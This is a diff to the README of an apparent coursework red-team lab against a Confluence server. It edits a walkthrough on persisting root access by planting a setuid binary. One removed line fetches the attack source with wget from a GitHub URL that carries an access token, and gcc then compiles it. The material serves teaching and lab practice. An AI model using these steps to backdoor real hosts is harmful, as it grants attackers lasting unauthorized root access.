@@ -46,6 +46,9 @@ View/edit the lucidchart diagram [here](https://lucid.app/lucidchart/6e6578d6-0b
   - [Initial Access](#initial-access)
   - [Privilege Escalation](#privilege-escalation)
   - [Persistence](#persistence)
+    - [Persistence](#persistence-1)
+      - [Persistence using Suid Binary](#persistence-using-suid-binary)
+      - [Persistence using account](#persistence-using-account)
   - [Credential Access](#credential-access)
   - [Collection & Exfiltration](#collection--exfiltration)
   - [Impact](#impact)
@@ -157,10 +160,11 @@ $ vagrant provision --provision-with privesc
 ### Persistence using Suid Binary
 - After gaining root access via privilege escalation, create suid binary to allow anyone to execute the file.
 - Allows attacker to regain root privileges from low privileged user account.
-    setup
+    
+    Setup
     ```
     root@confluence:/# cd /tmp
-    root@confluence:/tmp# wget "https://raw.githubusercontent.com/kevinnivekkevin/3204_coursework_1/main/attack/Persistence binarysuid?token=GHSAT0AAAAAABZGUXA66OLI56PBA7NBDXSYY2U5H6A" -O /tmp/suid.c
+    root@confluence:/tmp# cp /vagrant/attak/persistence/binarysuid /tmp/suid.c
     ...
     ...
     root@confluence:/tmp# gcc suid.c -o suid
